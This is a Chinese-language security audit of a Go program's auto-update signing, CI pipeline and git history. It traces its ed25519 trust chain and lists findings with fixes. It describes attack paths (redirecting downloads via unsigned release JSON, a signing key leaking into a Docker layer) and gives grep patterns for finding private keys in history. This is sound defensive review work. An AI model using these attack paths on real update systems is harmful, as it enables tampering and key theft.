# E：自动更新与供应链审查报告

审查人：E 号对抗性审查员 · 范围：`internal/update/`、`tools/build/`、`tools/icogen/`、根目录构建脚本与容器、`.gitea/` CI 与脚本、`packaging/` 的 Go 侧打包逻辑与维护者脚本、`go.mod`/`vendor`、git 历史。本机无 Go 工具链，未执行任何构建、签名、打包或 CI 触发动作。

## 摘要

**信任根问题（必须直接回答）：有。** 本程序**存在端到端可验证的信任根**——一个编译进二进制的 ed25519 公钥，签名覆盖 `SHA256SUMS` 的**逐字节内容**，而安装产物的 SHA-256 又从这份经验证的清单里读出。要投递任意二进制，攻击者必须伪造 ed25519 签名，即需要**签名私钥**；仅控制域名/DNS/TLS 路径（哪怕完整接管 `git.zqlhub.com`）**不足以**替换被安装的字节。

理由一句话：`internal/update/publickey.go:13` 的 `PublicKey` 非空且是 32 字节 ed25519 公钥，`update.go:149` 用它验证 `SHA256SUMS` 的原始字节，`install.go:152` 再拿这份清单里的摘要去比对归档——两跳都在同一进程内、在写入程序文件之前完成。

**该信任根的边界（本次最重要的结论）**：签名**只覆盖产物内容与文件名**，**不覆盖任何版本元数据**——`Tag`（版本号）、`Draft`/`Prerelease` 标志、资产名表、`browser_download_url` 全部来自未签名的 forge JSON（`forge.go:81-91,124-144`）。因此控制该 JSON 的攻击者可以：**伪造版本号显示**、**把下载重定向到任意主机（含明文 http）**、**拒绝服务**；但**不能**替换字节、**不能**降级到旧版本、**不能**改变写入路径（安装目标是本地 `os.Executable()`，见 `appstate.go:69-78`，从不来自元数据）。

发现共 **16** 项：**S0=0，S1=0，S2=1，S3=11，S4=4**。没有 S0/S1：不存在可被绕过的验证路径、不存在未经验证的安装路径、历史与工作区中都不存在私钥材料。

已核实的**强项**（均为逐字核对后的否定结论，见文末"覆盖声明"）：
- 密钥从未被提交：125 个提交中没有任何 `*.key`/`*.pem`/`signing.key` 被添加过，没有任何 blob 含 `PRIVATE KEY`/`BEGIN OPENSSH`，也没有任何 88 字符 base64（64 字节 ed25519 私钥）行。
- `README.md:527-532` 关于"私钥写在检出目录之外、签名只从环境变量读"的声明**为真**：`signing.go:132` 只读 `SDAUTOLOGIN_SIGNING_KEY`，`signing.go:28-37` 的 keygen 写到 `os.UserConfigDir()` 或 `SDAUTOLOGIN_SIGNING_KEY_FILE`。该声明由 `0a2c6a2` 才成立——它删掉了一段从工作树读 `signing.key` 的回退。
- CI 从不使用任何第三方 action（`uses:` 为 0，在 `e90aeb0` 中被移除），从不使用 `pull_request_target`，且 `pull_request:` 触发器在 `532f4b7`（2026-09-24）就已删除，**早于**签名密钥 secret 被引入的 `bedf9c5`（2026-10-08）——fork PR 从来没有读取签名密钥的窗口。
- `vendor/modules.txt` 与 `vendor/` 实际内容**完全一致**（7 个包全部存在，0 个未列出的 Go 包目录），`go.sum` 对 3 个依赖的 `h1:` 与 `/go.mod` 哈希齐全。
- 签名产物**不受 CRLF 危害**：签名与清单都在构建时由 Go 生成（`"\n"`，Go 不做换行转换），`dist/` 被 gitignore，且验证是对磁盘原始字节做的——换行被改动只会导致硬失败，不会被静默接受（`sign.go:108` 容忍 `\r` 只在**解析**侧，无法用来绕过摘要）。

## 更新信任链图

### 调用链（函数级，每环节给 file:line）

**A. 点按钮 / 跑命令 → 查到有新版**

1. 触发点 1（About 页按钮）：`internal/app/settings.go:705` → `AppState.CheckForUpdateNow`（`appstate.go:130`）→ `Service.CheckForUpdateNow`（`service.go:698`）。**该路径刻意忽略 `checkForUpdates` 开关**（`service.go:694-695` 注释明说）。
2. 触发点 2（`update` 子命令）：`cmd/SDAutoLogin/cli.go:810 cmdUpdate` → 同样忽略开关（`cli.go:807-809`）。
3. 触发点 3（自动检查）：`service.go:592` → `checkForUpdate`（`service.go:607`），**受 `cfg.CheckForUpdates` 门控**，默认 `false`（`config.go:153`）。
4. `updater.Check`（`appstate.go:82`）→ `update.Client.Check`（`update.go:66`）→ **先读公钥**：`_, err := PublicKeyBytes()`，`Signed = (err == nil)`（`update.go:67-68`）。
5. → `client.check`（`update.go:73`）→ `Newest`（`forge.go:154`）→ `Releases`（`forge.go:103`）→ `GET {Base}/api/v1/repos/{Repo}/releases?limit=30`（`forge.go:104`）。
   - `Base`/`Repo` 来自 `app.Repo = "https://git.zqlhub.com/zqlan/SDAutoLogin"`（`payload.go:16,27-35`）。**实际是 HTTPS，但没有任何代码强制 scheme 为 https。**
   - `forge.go:110` 用 `c.HTTP`（`forge.go:77`，一个裸 `&http.Client{}`）。
6. 排序与筛选：跳过 `Draft`（`forge.go:130`）、跳过 `ParseVersion` 失败的 tag（`forge.go:165-171`）、stable 通道跳过预发布（`forge.go:174`）、必须有 `v.NewerThan(current)`（`forge.go:177`），再按 semver 排序取最大（`forge.go:185-188`）。

**信任假设 1**：forge 的 HTTPS 与 DNS 是可信的。若不成立，则 tag/资产 URL 全部可被替换为任意值（内容仍受第 3 步签名保护）。

**B. 决定是否安装**

7. `lookForUpdate`（`service.go:635`）→ `check.Newer` / `check.Signed` / `check.Install.Possible` 三道门（`service.go:650-658`），任一不满足即不下载。
8. `Install.Possible` 由 `SelfInstall`（`install.go:83`）判定：非 windows → 不可能（`install.go:84`，`ArchiveName` 只对 windows 返回 ok）；目录里有 Scoop/winget 标记 → 不可能（`install.go:88,109-124`）；**用真实建临时文件来探测目录可写**（`install.go:94-100`）——注释 `install.go:91-93` 明确说明权限位不可信。

**C. 下载与验证 → 写入**

9. `Client.Install`（`update.go:103`）→ **第一步就是取公钥**（`update.go:104-107`），取不到（`ErrUnsigned`）直接返回错误，**不存在无密钥的安装路径**。
10. `install`（`update.go:113`）：`ArchiveName(strings.TrimPrefix(rel.Tag,"v"), GOOS, GOARCH)` 得到目标文件名（`update.go:120`，`install.go:43-53`）。
11. 找 `SHA256SUMS` 与 `SHA256SUMS.sig` 两个资产，**缺任一个即报错**（`update.go:125-132`）。
12. `fetchSmall` 取两者（`update.go:139,144` → `update.go:182`），30 秒超时、`io.LimitReader(body, 64KiB+1)` 并检查超限（`update.go:197-203`）。用 `http.DefaultClient`（`update.go:187`）。
13. **验证签名**：`VerifySignature(pub, sums, string(sig))`（`update.go:149` → `sign.go:78`）。失败即报 "the release is not signed by this project" 并返回（`update.go:150`）。
14. `ParseChecksums`（`update.go:153` → `sign.go:105`）→ `sumsList.Sum(name)`（`update.go:157` → `sign.go:132`）：**名字不在签名清单里就不装**（`update.go:159`）。
15. `Fetch(parent, asset.URL, want)`（`update.go:166` → `install.go:129`）：下载归档，`sha256.Sum256(data)` 与清单里的摘要比对，不等即报错（`install.go:151-154`）。
16. `UnpackProgram`（`update.go:170` → `install.go:159`）：从 zip 里按 `filepath.Base(f.Name)` 等于 `SDAutoLogin.exe` 找出程序（`install.go:168`），**只读字节、不按名字解包到磁盘**，所以 zip-slip / 路径穿越在此不可利用。
17. `Replace(t.ExePath, program)`（`update.go:174` → `install.go:190`）：`os.CreateTemp(dir, base+".new")` 同目录暂存（`install.go:194`）→ 写 → `Chmod` 沿用旧程序权限位（`install.go:210-212`）→ `os.Remove(exePath+".old")`（`install.go:215`）→ `os.Rename(exePath, leftover)`（`install.go:216`）→ `os.Rename(stagedPath, exePath)`（`install.go:220`），失败则把 `leftover` 改回来（`install.go:222-224`）。
18. 生效时机：**不重启、不提权、不弹 UAC**，只写一行日志"takes effect on the next start"（`cli.go:879-880`、`service.go:666-668`）。

**信任假设 2**：运行进程对自身所在目录有写权限。`SelfInstall` 用真实写入探测来判定（`install.go:94`），且**从不静默提权**——目录不可写时直接拒绝（`install.go:95-97`），这是安全的方向。

**信任假设 3（信任根）**：`publickey.go` 里那一行公钥就是项目方的公钥。

### 每环节的信任根覆盖情况

| 环节 | 是否被签名覆盖 | 攻击者若控制该环节能做什么 |
|---|---|---|
| 协议/主机（HTTPS、DNS） | 否 | 拿不到字节替换能力；可篡改 JSON 元数据 |
| releases JSON：`tag_name` | **否** | 伪造显示的版本号（日志/UI/JSON）；**不能**降级（见下） |
| releases JSON：`browser_download_url` | **否** | 把下载指向任意主机（含 `http://`），观察客户端 IP/UA，拒绝服务 |
| `SHA256SUMS` 字节 | **是** | 必须伪造 ed25519 |
| 归档字节 | **是**（经清单摘要） | 必须伪造 ed25519 |
| 安装目标路径 | 不适用（本地取值） | 无法影响 |

**为什么"元数据未签名"没有变成降级/替换漏洞**（这是设计上的运气，不是明确的检查）：版本号决定要查的文件名 `SDAutoLogin-<tag>-windows-<arch>.zip`，而该名字必须出现在**某份被签名的清单**里（`update.go:120,157-160`）。攻击者若把 tag 抬高到 `v9.9.9`，则要查的名字在真清单里不存在 → 报错；若用旧版本的合法 tag，则 `Newest` 的 `v.NewerThan(current)`（`forge.go:177`）把它筛掉。两条路都封死。**这是隐含不变量，不是显式检查**——一旦有人把 `ArchiveName` 改成不再依赖 tag（例如改成固定名），降级防护会无声消失。建议加注释或断言的正是这一点。

## 签名覆盖范围

### 被签名的确切字节序列

被签名对象 = `dist/packages/SHA256SUMS` 的**完整文件字节**。生成规则（`tools/build/pack.go:417-449`，逐字）：

```go
for _, e := range entries {
    if e.IsDir() || e.Name() == checksumsFile || strings.HasSuffix(e.Name(), update.SignatureSuffix) {
        continue
    }
    data, err := os.ReadFile(filepath.Join(dir, e.Name()))
    ...
    fmt.Fprintf(&listing, "%s  %s\n", sha256Hex(data), e.Name())
}
```

即：对 `dist/packages/` 里**除目录、`SHA256SUMS`、任何 `*.sig` 之外**的每个文件，按 `os.ReadDir` 的名字序（字节序），拼接

```
<小写十六进制 64 字符 SHA-256(文件字节)>  0x20 0x20  <文件名>  0x0A
```

分隔符是**两个空格**（与 `sha256sum` 的输出格式一致），行尾是单个 `\n`。`sha256Hex` = `hex.EncodeToString(sha256.Sum256(data)[:])`（`pack.go:483-486`）。

### 签名文件的确切字节序列

`tools/build/signing.go:176` → `internal/update/sign.go:37-41`（逐字）：

```go
func Sign(priv ed25519.PrivateKey, data []byte) string {
	sig := ed25519.Sign(priv, data)
	pub := priv.Public().(ed25519.PublicKey)
	return base64.StdEncoding.EncodeToString(sig) + " " + KeyID(pub) + "\n"
}
```

即 `SHA256SUMS.sig` = `base64.StdEncoding(64 字节 ed25519 签名)` + `0x20` + `KeyID(pub)` + `0x0A`，其中 `KeyID(pub)` = **公钥前 4 字节的小写十六进制**（`sign.go:23-28`，8 个字符）。

### 验证（`sign.go:78-97`，逐字）

```go
fields := strings.Fields(text)
if len(fields) != 2 { return errors.New("the signature is not in the form this program writes") }
if fields[1] != KeyID(pub) { return fmt.Errorf("the release is signed with key %s, and this build carries %s", ...) }
sig, err := base64.StdEncoding.DecodeString(fields[0])
...
if len(sig) != ed25519.SignatureSize { ... }
if !ed25519.Verify(pub, data, sig) { return errors.New("the signature does not match the file it came with") }
```

逐问回答：

- **算法**：ed25519（EdDSA over Curve25519，公钥 32 字节，签名 64 字节），`crypto/ed25519` 标准库。`publickey.go:13` 的值为 `Qyh5LHHJwL83IlHmu2fZBmdeMOdzqZoJnnwZng0GcM0=`，解码为 32 字节；`decodeKey` 强制校验长度（`sign.go:68-70`）。
- **被签名的确切字节**：见上，"摘要+两空格+文件名+`\n`"的整份 `SHA256SUMS`，**覆盖内容与文件名**，不覆盖版本号、发布时间、下载 URL、目标路径。
- **是否需要 canonicalization**：不需要也不做——签名对象是**磁盘上的原始字节**，验证时读同一份字节（`update.go:139` 取 `sums`，`update.go:149` 原样传入），中间没有任何重新序列化。`VerifySignature` 用 `strings.Fields` 读签名文件（`sign.go:79`），对尾随空白/CRLF 宽容；这是签名文件一侧的正确宽容，签名内容一侧零容忍。**无缺陷。**
- **是否忽略错误**：**没有**。`update.go:149-151` 验证失败即 `return "", fmt.Errorf(...)`；`update.go:159` 清单里没这个名字即错误；`install.go:152-154` 摘要不符即错误。**不存在 `if err != nil { log; continue }` 形态的"验证失败但照装"路径。** （唯一忽略错误的地方是构建侧 `verify.go:69`，见 F-3。）
- **是否常量时间比较**：`fields[1] != KeyID(pub)`（`sign.go:83`）是普通字符串比较，但两边都是**公开**数据（密钥 id 与被验签的公钥都来自二进制与公开的 `.sig` 文件），验证侧没有秘密，故不需要常量时间；真正的密码学比较由 `ed25519.Verify` 完成。**据此判定为非缺陷。**
- **公钥轮换保护**：`VerifySignature` 在验签前先比对 key id（`sign.go:83-85`），不匹配时**分别报出两个 key id**，把"轮换"与"伪造"区分开（`sign.go:74-77` 注释）。但 `publickey.go:13` 是**单个 `const`，只有一个密钥槽位**，没有密钥集、没有有效期、没有内置轮换过渡。轮换要求**所有已安装副本手工升级**（`signing.go:57-63` 的拒绝信息逐字说明了这一代价），有测试覆盖（`update_test.go: TestRotatingTheKeyLeavesTheCopiesBuiltBeforeItBehind`）。**没有机制性缺陷，但可用性代价高**；`keygen` 拒绝覆盖已有密钥（`signing.go:57-64`），轮换必须显式删文件，这是正确的方向。
- **签名覆盖产物还是仅清单**：**仅清单**（一份签名服务一次发布），但清单里的摘要逐个绑定产物字节，且**清单本身不含自己的 `.sig`**（`pack.go:426` 明确排除，`pack.go:413-416` 说明理由：否则签名会改变被签对象）。这是自洽的设计。补充：清单里**同时**包含摘要和文件名，所以"名字"也是被签名的——攻击者无法把合法摘要嫁接到另一个文件名上。

## CI 与发布流程清单

`on:`：仅 `push: tags: ["v*"]`（`ci.yml:14-15`）与 `workflow_dispatch`（`ci.yml:20`）。**无 `pull_request`、无 `pull_request_target`、无 `schedule`。**
`permissions: contents: write` 在**工作流级**（`ci.yml:8-9`），对 `test` 这个只读 job 同样生效。
`env:`：`INSTANCE: https://git.zqlhub.com`、`DEBIAN_MIRROR: mirrors.tencentyun.com`（`ci.yml:24-28`）。

| job | runner / 容器 | 涉及 secrets | 可被 fork PR 触发？ | 上传产物 | 签名步骤 | 对产物做 verify |
|---|---|---|---|---|---|---|
| `test`（`ci.yml:31`） | `ubuntu-latest` / `golang:1.26` | `github.token`、`GITHUB_TOKEN`、`GITEA_TOKEN`（仅用于克隆） | 否（无 PR 触发器） | 无 | 无 | 间接：`go run ./tools/build test` = `go vet ./...` + `GOOS=windows go vet ./...` + `go test -race ./...`（`main.go:369-386`） |
| `packages`（`ci.yml:80`） | `ubuntu-latest` / `golang:1.26` | 同上 + **`SDAUTOLOGIN_SIGNING_KEY`**（仅 sign 步） | 否 | **无**（`ci.yml:142-143` 显式说明不上传 artifact） | **有**：`ci.yml:157-161`，条件 `startsWith(github.ref,'refs/tags/v') \|\| github.event_name == 'workflow_dispatch'` | **有**：`ci.yml:139-140` 的 `verify` 在 `sign` **之前** |

`packages` 的步骤顺序（这是本次审查的关键）：
1. 克隆（`ci.yml:86-108`，把 token 拼进 remote URL）
2. 装格式工具（`ci.yml:112-127`，从 `DEBIAN_MIRROR` 装的 `rpm libarchive-tools xz-utils zstd`，失败回退到镜像自带源）
3. `go run ./tools/build packages`（`ci.yml:130`）
4. `go run ./tools/build verify`（`ci.yml:140`）
5. `go run ./tools/build sign`（`ci.yml:161`）
6. 装 `curl jq`（`ci.yml:166`）
7. 发 release（`ci.yml:170-299`）：**拒绝发布没有 `.sig` 的版本**（`ci.yml:189-193`）；发布体取自 `CHANGELOG.md`；逐个删除同名旧附件再上传（`ci.yml:281-298`）
8. 更新 wiki（`ci.yml:304-352`）

逐项回答任务清单里的问题：

- **未固定到 commit SHA 的 action**：**没有，一个都没有**。当前 `ci.yml` 里 `uses:` 出现次数为 0；`git log -S'uses: actions/'` 命中 `e90aeb0`（"Run every job step as a command of the image, not an action"），正是它把 `actions/checkout@v4` 换成了手写 `run:` 步骤。**这是本仓库在供应链上最强的项。** 但容器与 runner 标签本身是可变的（F-6）。
- **`pull_request_target`**：全部历史中从未使用（`git log --all -S'pull_request_target'` 无命中）。
- **fork PR 能否读到 secrets**：**不能**。`pull_request` 触发器在 `532f4b7`（2026-09-24）被删除，而它**是** `bedf9c5`（2026-10-08，引入 `secrets.SDAUTOLOGIN_SIGNING_KEY` 的提交）的祖先——已用 `git merge-base --is-ancestor 532f4b7 bedf9c5` 返回 0 验证。签名密钥进入仓库时，PR 触发路径已经不存在。
- **secret 回显到日志的可能**：未发现。无 `set -x`，无 `echo "$token"`，无 `git remote -v`；token 只出现在 remote URL（`ci.yml:56,103,317`）与 `curl -H "Authorization: token $token"`（`ci.yml:227,288,324`）中。但这两种用法本身有暴露面（F-8）。
- **密钥取得方式**：只在 `sign` 步通过 `env: SDAUTOLOGIN_SIGNING_KEY: ${{ secrets.SDAUTOLOGIN_SIGNING_KEY }}`（`ci.yml:160`）注入，由 `signing.go:132 os.Getenv` 读取。**与 README 的声明一致。**
- **`workflow_dispatch` 的边界**：`ci.yml:16-19` 注释声称手工运行不能产出 release，这一点**成立**（发布/wiki 两步都带 `startsWith(github.ref,'refs/tags/v')` 条件，`ci.yml:164,171,305`），但手工运行的 `sign` 步（`ci.yml:158`）**对任意 ref 生效**（F-7）。
## git 历史泄漏考古结论

**结论：未发现密钥或凭据被提交进仓库。** 依据（全部为可复现命令的输出）：

1. `git log --all --diff-filter=A --name-only -- '*.key' '*.pem' '*signing*' '*secret*' '*credential*' '*.p12' '*.pfx' 'id_rsa*' '*.sig' 'SHA256SUMS'` 只命中两个**源码**文件：`tools/build/signing.go`（`bedf9c5`）与 `tools/build/signing_test.go`（`0a2c6a2`）。没有任何密钥文件被添加过。
2. `git log --all -p -S'PRIVATE KEY'`：**无输出**。
3. 对全部 125 个提交的每个 blob 执行 `git grep -E 'BEGIN [A-Z ]*PRIVATE KEY|BEGIN OPENSSH'`：**无命中**（只有 `ed25519.PrivateKey(raw)` 这种类型转换，属于签名逻辑本身）。
4. 对全部 125 个提交执行 `git grep -E '^[A-Za-z0-9+/]{86}==$'`（64 字节私钥的 base64 形态）：**0 命中**。
5. 对全部 125 个提交执行 `git grep 'Qyh5LHHJwL83IlHmu2fZBmdeMOdzqZoJnnwZng0GcM0='`：只出现在 `internal/update/publickey.go`，横跨 9 个提交，**值从未变过**。
6. `git log --all --diff-filter=A -- '*.key' '*.pem'`：**无输出**。历史对象里没有可恢复的密钥。
7. 全部历史中 CI 引用过的 secret 名只有三个：`secrets.GITEA_TOKEN`、`secrets.GITHUB_TOKEN`、`secrets.SDAUTOLOGIN_SIGNING_KEY`，**从未有硬编码值**。

**危险中间态的核实**（任务点名的三个提交）：

- `920d636`（"Make the key, pin what rotating it costs, and stop the keyless tests skipping"）：把真公钥写进 `publickey.go`。其提交信息说"the private half is in signing.key, **which is gitignored and 0600**"——此时 keygen 写的路径是 `filepath.Join(root, signingKeyFile)`，即**检出目录根部**。该文件被 `/signing.key`（`.gitignore:19`）忽略，且第 1、6 项证明**它从未被 `git add` 过**。故：私钥曾在维护者磁盘的仓库根部存在过，但**没有进入 git 历史**，无需按"高危可恢复"处理。
- `e9cdfe7`（"Keep the signature out of the list it signs, and sign last"）：修正了"清单把自己签名的 `.sig` 也算了进去"的自指缺陷，并把 `sign` 放到流程最后。核对当前代码：`pack.go:426` 确实排除 `*.sig`，`pack.go:442-444` 在清单内容变化时删除旧签名，`verifyChecksumsSignature` 在 `verify` 开头检查（`verify.go:70`）。**最终状态正确。**
- `0a2c6a2`（"Write the signing key outside the checkout, and read it only from the environment"）：**这才是让 README 声明成立的那个提交**。它删除了这段代码（`git show 0a2c6a2 -- tools/build/signing.go` 的 `-` 侧逐字）：

```go
  // The file keygen wrote is the fallback, so signing a release by hand on
  // the machine that holds the key works without repeating it.
  data, err := os.ReadFile(filepath.Join(root, signingKeyFile))
  if err != nil { return fmt.Errorf("no signing key: set %s, or run keygen to make one", ...) }
  text = string(data)
```

  即 `bedf9c5`…`1311d01` 期间，**能从工作树读到一个密钥文件就能签出所有已安装副本都接受的发布**。当前代码（`signing.go:131-135`）只读环境变量，并有测试 `TestSigningDoesNotReadAKeyFromTheTree`（`signing_test.go:21-42`）把工作树里放一个可用密钥、断言它必须被忽略。**已修复，但历史窗口真实存在**（按"已修复的历史问题"看待，不单列高危）。

**当前工作区的 2 个未提交修改**：`git diff` 全文（`git diff --numstat` 为 `0 0`，`git diff --ignore-all-space --stat` 亦为空）：

    diff --git a/build.sh b/build.sh
    old mode 100755
    new mode 100644
    diff --git a/.gitea/scripts/dedupe-release-assets.sh b/.gitea/scripts/dedupe-release-assets.sh
    old mode 100755
    new mode 100644

**内容零改动，只丢了可执行位。** `git ls-files -s` 显示索引里仍是 `100755`，`core.fileMode=true`。评估：**不引入安全风险**（两个文件都不是 CI 路径上的执行入口：`ci.yml:115` 是 `. .gitea/scripts/apt-mirror.sh`（source，不需要 +x），`ci.yml:334` 是 `sh ./.gitea/scripts/wiki-pages.sh`（显式解释器，不需要 +x），`dedupe-release-assets.sh` 甚至不在 `ci.yml` 里被调用），但 `./build.sh` 与文档化的 `./.gitea/scripts/dedupe-release-assets.sh v1.1.0 --apply` 会立刻失败。判定为检出环境（Windows/UNC 挂载不保留 mode 位）造成的假改动，见 F-14。

## 发现

### [S2] F-1 发布元数据未签名：版本号可伪造，下载可被引向任意主机（含明文 http）
- 类别：更新信任链
- 位置：`internal/update/forge.go:81-91`（`forgeRelease` 全部字段）、`internal/update/forge.go:104`、`internal/update/forge.go:124-144`、`internal/update/update.go:139,144,166`、`internal/update/forge.go:71-79`、`internal/update/install.go:129-136`
- 证据：

      // forge.go:86-91 —— 版本号与下载地址全部来自未签名的 JSON
      Assets      []struct {
          Name string `json:"name"`
          Size int64  `json:"size"`
          URL  string `json:"browser_download_url"`
      } `json:"assets"`
      // forge.go:77 —— 裸客户端，无 CheckRedirect、无 scheme 检查
      HTTP: &http.Client{},
      // update.go:166 —— 直接拿元数据里的地址去下载
      archive, err := Fetch(parent, asset.URL, want)

- 攻击路径：攻击者位于 `git.zqlhub.com` 的 TLS/DNS 路径上（或接管该自建 Gitea）→ 改写 releases JSON：`tag_name` 改为任意字符串、三个资产的 `browser_download_url` 改为自己的主机（可用 `http://`，`http.DefaultClient` 会跟随跨主机重定向）→ 客户端把 `SHA256SUMS`、`.sig`、归档全部请求到攻击者主机 → 攻击者**原样返回真实的**清单/签名/归档（否则摘要与签名不过）→ 客户端显示"已更新到 v9.9.9"，日志、About 页与 `--json` 报告里出现攻击者选的版本号；同时攻击者获得一次带客户端 IP 与 UA 的回连，并可随时拒绝服务。
- 影响：**完整性不受影响**（字节替换需要伪造 ed25519，摘要由签名清单绑定；降级也被封死，理由见"更新信任链图"末段）。**机密性不受影响**（下载请求不带任何凭据，无 `Authorization` 头）。受影响的是**展示可信性**（用户看到的"最新版本"由攻击者决定，可用于社工引导）与**可用性**（拒绝更新），并附带一次回连。不持久。
- 修复：① `internal/update/forge.go:71` 的 `NewClient` 里强制 `strings.HasPrefix(base,"https://")`，否则返回错误；② 给 `NewClient` 与两个下载函数共用一个 `*http.Client`，设 `CheckRedirect` 拒绝跨主机/降级到 http 的跳转；③ 把资产 URL 的主机限制为 `c.Base` 的主机（`asset.URL` 只允许 path 部分）；④ 把 `Tag` 的合法性用 `update.ParseVersion` 校验后再使用（现在只在 `Newest` 里校验、`install()` 里直接用）。
- 置信度：高。

### [S3] F-2 `.dockerignore` 未排除 `signing.key`，而 `Dockerfile` 做 `COPY . .`
- 类别：供应链 / 密钥存放
- 位置：`.dockerignore:1-13`（无 `signing.key` 行）、`Dockerfile:27`、对比 `.gitignore:19`（有 `/signing.key`）
- 证据：

      # .dockerignore（全文 13 行，排除项）
      .git / .gitignore / .gitattributes / dist/ / build/ / build-*/ / logs/ / config.json / *.exe / Dockerfile / .dockerignore
      # Dockerfile:27
      COPY . .

- 攻击路径：维护者在 `0a2c6a2` 之前运行过 `go run ./tools/build keygen`（该版本把私钥写到 `<repo>/signing.key`），或按旧文档手工把私钥放在仓库根 → `.gitignore` 挡住了 git，但 `.dockerignore` 没有 → `docker build` 的 `COPY . .` 把它带进 build 阶段的层 → 任何能取到该镜像或跑 `docker history`/`docker save` 的人（含 CI 构建节点上的其他用户）拿到签名私钥 → 可为所有已安装副本签出被接受的发布。
- 影响：完整性彻底失陷（持久，且撤销需要一次高成本的全量手工轮换）；机密性失陷。前置条件现实度中等（需要那台机器上确实残留旧位置密钥文件）。
- 修复：在 `.dockerignore` 加 `signing.key`、`*.key`、`*.pem`；更稳的是把 `Dockerfile` 的 `COPY . .` 改成显式 `COPY go.mod go.sum ./` + `COPY cmd internal tools packaging winres LICENSE README.md CHANGELOG.md ./`。
- 置信度：高（配置事实确定；是否已发生取决于维护者机器状态，无法从仓库确认）。

### [S3] F-3 构建侧质量门 `verify` 对"未签名的包集合"返回成功，且丢弃取公钥的错误
- 类别：架构 / 测试盲区
- 位置：`tools/build/verify.go:69`、`tools/build/verify.go:136-145`
- 证据：

      pub, _ := update.PublicKeyBytes()            // verify.go:69 —— 错误被丢弃
      ...
      sig, err := os.ReadFile(sigPath)
      if err != nil {
          if os.IsNotExist(err) {
              return nil                            // verify.go:141-143 —— 没有 .sig 就当作通过
          }

- 攻击路径：无外部攻击者；这是**门禁语义弱化**：把 `verify` 当成"发布前校验过签名"的保证是不成立的——在 `ci.yml` 的顺序里 `sign` 在 `verify` 之后（`ci.yml:140` vs `157`），所以 `verify` 运行时 `.sig` **永远不存在**，`verifyChecksumsSignature` 永远走"没有签名 → 通过"这一支。真正兜底的是发布步的 `ci.yml:189-193` 存在性检查与 `signing.go:177` 的自验。后果：若 `.sig` 的写入被截断（无 fsync）、或磁盘上残留一个旧 `.sig`，**流程里没有任何一步重新读取磁盘上的 `.sig` 并用磁盘上的 `SHA256SUMS` 验它**。同时 `pub, _` 把"没有密钥"和"密钥不可读"合并成 nil，掩盖了后一种损坏。
- 影响：完整性（低概率，需要写入或磁盘故障恰好发生且此后无人读回）。不持久。
- 修复：在 `sign` 之后加一步 `go run ./tools/build verify`（此时签名已存在，会走真实校验路径），或者让 `verify` 接受一个 `--require-signature` 开关并在 sign 之后以它运行；把 `verify.go:69` 改成区分 `errors.Is(err, update.ErrUnsigned)` 与其它错误。
- 置信度：高。

### [S3] F-4 从归档里读程序时静默截断（`io.LimitReader` 少了 `+1` 哨兵）
- 类别：更新信任链 / 加固
- 位置：`internal/update/install.go:176`，同类写法 `internal/update/install.go:144`、`internal/update/forge.go:120`
- 证据：

      // install.go:171-176 —— 读满上限就返回，不报错
      rc, err := f.Open()
      if err != nil { return nil, err }
      defer rc.Close()
      return io.ReadAll(io.LimitReader(rc, maxArchiveBytes))

  对比同一仓库里**正确**的写法 `update.go:197-203`：`io.LimitReader(resp.Body, maxSmallBytes+1)` 且 `if len(data) > maxSmallBytes { return nil, fmt.Errorf(...) }`。
- 攻击路径：无直接攻击者（归档字节已被签名清单的摘要绑定）。风险是**静默不完整写入**：`UnpackProgram` 返回被截断到 128 MiB 的程序字节，`Replace` 照样覆盖 exePath，得到一个损坏的可执行文件。`Fetch`（`install.go:144`）与 `Releases`（`forge.go:120`）同样少 `+1`，前者恰好 128 MiB 的响应会被截断后**摘要必然不符**（安全方向，只是错误信息误导），后者恰好 4 MiB 会 JSON 解析失败。
- 影响：可用性（一个无法启动的程序被装到原位，且没有回滚）。不持久到代码层，但用户侧需要手工修复。
- 修复：照 `update.go:197-203` 的写法加 `+1` 与超限检查；`Replace` 成功后可选地把写出的字节数与被验证的 `len(newProgram)` 比一次。
- 置信度：高。

### [S3] F-5 `Replace` 可能让被替换的程序失去可执行位，且写盘与改名之间没有 fsync
- 类别：提权 / 加固（Unix 路径）
- 位置：`internal/update/install.go:199-212`
- 证据：

      if _, err := staged.Write(newProgram); err != nil {   // install.go:199 —— 忽略写入字节数 n
      ...
      if info, err := os.Stat(exePath); err == nil {        // install.go:210 —— stat 失败就跳过 chmod
          os.Chmod(stagedPath, info.Mode().Perm())          // 保持 os.CreateTemp 的 0600

- 攻击路径：无外部攻击者。`os.CreateTemp` 以 `0600` 建文件；只有在 `os.Stat(exePath)` **失败**时才不会 `Chmod`——此时替换后的文件是 `0600`，在 Unix 上**没有执行位**，程序再也起不来（Windows 忽略 mode，故只在 Unix 生效，而 Unix 上自替换路径本就被 `ArchiveName` 挡掉，`install.go:44-46`）。另外 `staged.Write` 只检查 `err` 不看返回的 `n`，且改名前无 `Sync()`，断电可能留下截断的二进制。
- 影响：可用性（低概率）；`0600` 的降权本身是安全方向，不会造成越权。
- 修复：`os.Stat` 失败时显式用 `0o755`；读 `n` 并与 `len(newProgram)` 比对；`staged.Close()` 前先 `staged.Sync()`。
- 置信度：高。

### [S3] F-6 CI 镜像/runner 与构建期工具未固定，格式工具来自第三方镜像
- 类别：版本固定 / 供应链
- 位置：`.gitea/workflows/ci.yml:32-33,82-83,28,112-127,166`、`Dockerfile:24,33`
- 证据：

      # ci.yml:32-33（两个 job 相同）
      runs-on: ubuntu-latest
      container: golang:1.26
      # ci.yml:28 / 127 —— 第三方镜像 + 运行期安装未固定版本的包
      DEBIAN_MIRROR: mirrors.tencentyun.com
      apt-get install -y --no-install-recommends rpm libarchive-tools xz-utils zstd

      # Dockerfile
      FROM golang:1.26 AS build
      FROM alpine:3.21

- 攻击路径：`golang:1.26`、`alpine:3.21`、`ubuntu-latest` 都是**可变标签**——上游或其镜像仓库被投毒/标签被重推，CI 与发布产物就建立在一套未经固定摘要的基底上（本项目**所有**发布产物都由这个容器产出）。`apt-mirror.sh` 把 Debian 源整体改指向 `mirrors.tencentyun.com`，该主机成为 CI 里 `rpm`/`bsdtar` 等**校验工具本身**的提供者——这些工具是 `verify` 的裁判（`verify.go:211,265`），投毒它们就能让 `verify` 对损坏的包报 OK。
- 影响：完整性（需要第三方镜像或上游被投毒，前置条件特殊）。持久到下一次改标签为止。
- 修复：`container:` 与 `FROM` 用 `@sha256:` 摘要固定；`runs-on` 用自建带版本的 runner 标签；`apt-get install` 固定版本号（`rpm=4.x.y-1`）或用预构建的、摘要固定的工具镜像。
- 置信度：高（配置事实明确）。

